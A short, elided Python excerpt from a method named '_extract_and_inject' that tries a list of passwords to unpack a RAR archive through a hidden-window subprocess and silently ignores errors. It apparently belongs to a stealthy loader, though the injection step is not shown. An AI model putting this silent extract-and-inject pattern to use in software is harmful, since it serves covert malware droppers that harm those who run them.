    ...
    def _extract_and_inject(self, rar_path):
        ...
        for _pw in _passwords:
            try:
                ...
                if _pw: _cmd.insert(2, f'-p{_pw}')
                _proc = subprocess.run(_cmd, capture_output=True, timeout=120, creationflags=0x08000000)
                if _proc.returncode == 0 or _proc.returncode == 1:
                    _extract_ok = True
                    break
            except: pass
        if _extract_ok:
